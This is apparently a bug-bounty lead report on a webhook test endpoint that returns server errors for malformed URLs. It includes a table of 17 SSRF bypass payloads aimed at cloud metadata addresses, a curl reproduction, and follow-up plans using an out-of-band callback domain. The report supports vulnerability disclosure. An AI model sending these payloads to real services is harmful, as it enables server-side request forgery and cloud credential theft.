# LEAD: Webhook URL parser raises 500 on specific malformed hosts (potential parser-confusion)

**Endpoint**: `POST https://mixpanel.com/api/app/projects/{project_id}/webhooks/test`
**Severity hint**: Low-Medium. Currently a LEAD — needs investigation whether crash happens before or after TCP connect.
**Confidence**: 0.45 — 500 errors reliably triggered; impact uncertain.

## Summary
17 distinct URL inputs trigger a 500 "An unexpected error occurred. Error ID: <hex>" response from the webhook test endpoint, while well-formed URLs (whether targeting internal or external hosts) return either 400 "Failed to send" or 200. The 500 path indicates the URL passed schema validation but caused an unhandled exception in the fetcher (likely the URL-parsing or DNS-resolution layer).

Each Error ID is unique, suggesting per-request stack trace correlation server-side — useful for HackerOne triage to identify the affected library.

## Parser-crashing URL inputs (each returns 500 with unique Error ID)

| Tag | URL | Notes |
|---|---|---|
| zp-0169 | `http://169.0254.0169.0254/latest/meta-data/` | Zero-padded octets |
| zp-mixed-hex | `http://0xa9fe.0xa9fe/latest/meta-data/` | Mixed hex+two-octet form |
| zp-0xa9fe-decimal | `http://0xa9fe.43518/latest/meta-data/` | Hex+decimal |
| zp-decimal-leadzero | `http://02852039166/latest/meta-data/` | Octal interpretation of decimal IP |
| zp-5octets | `http://169.254.169.254.1/` | 5-octet host |
| nul-pre | `http://169.254.169.254%00/latest/meta-data/` | NUL byte after host |
| nul-host-prefix | `http://%00169.254.169.254/` | NUL byte before host |
| nul-encoded-double | `http://169.254.169.254%2500/` | Double-encoded NUL |
| cr-host | `http://169.254.169.254%0d/` | CR byte |
| lf-host | `http://169.254.169.254%0a/` | LF byte |
| tab-host | `http://169.254.169.254%09/` | TAB byte |
| space-host | `http://169.254.169.254%20/` | Space in host |
| double-encode-imds | `http://169.254.169.254%252Flatest%252Fmeta-data%252F` | Double-encoded path-as-host |
| ftp-scheme | `ftp://169.254.169.254/` | FTP scheme |
| idn-mgi | `http://xn--metadata-fya.google.internal/computeMetadata/v1/instance/` | Punycode IDN |
| pd-bs-dot-enc | `http://webhook.site%5C.169.254.169.254/` | URL-encoded backslash |
| pd-underscore | `http://_169.254.169.254/latest/meta-data/` | Underscore-prefix host |

## Why it is a lead
The 500 indicates an unhandled exception in the server-side URL processor. Three possibilities:
1. **Pre-connect parser exception** — the URL passed JSON schema (`format: uri`) but a downstream parser (e.g., `urllib3.util.parse_url`, `idna.encode`, `socket.gethostbyname`) raised. **No security impact** beyond reliability bug.
2. **Mid-connect crash** — the fetcher established a TCP connection and a follow-on processor (e.g., HTTP/2 negotiator, redirect handler) crashed. Could indicate the underlying transport already touched the internal host — would be an OOB-confirmable SSRF if the crash leaks data via Error ID side-channel.
3. **Parser-differential** — different validators disagree about which is the host; one says public, one says internal. If the validator (blocklist) says public but the connector says internal → instant SSRF.

## Reproduction
```bash
JWT_COOKIE="csrftoken=...; sessionid=..."
CSRF="..."
curl -s -X POST https://mixpanel.com/api/app/projects/4025923/webhooks/test \
  -H "Cookie: $JWT_COOKIE" -H "X-CSRFToken: $CSRF" \
  -H "Authorization: Session" -H "Content-Type: application/json" \
  -d '{"url":"http://169.0254.0169.0254/latest/meta-data/"}'
# 500 {"status":"error","message":"An unexpected error occurred ... Error ID: <unique>"}
```

## Next steps
1. With Mixpanel triage cooperation, request the stack trace tied to one Error ID to identify the crashing library.
2. Try the same URL forms against the cohort-sync trigger path (after that endpoint is discovered) — the parser may be different.
3. Use a Burp Collaborator OAST domain to determine whether the crash happens AFTER an outbound DNS lookup (would prove parser-differential SSRF).

## Out of scope for this lead
This lead does NOT include credential exfiltration. The 500 alone is informational/reliability without proof the body of an internal response was reached.
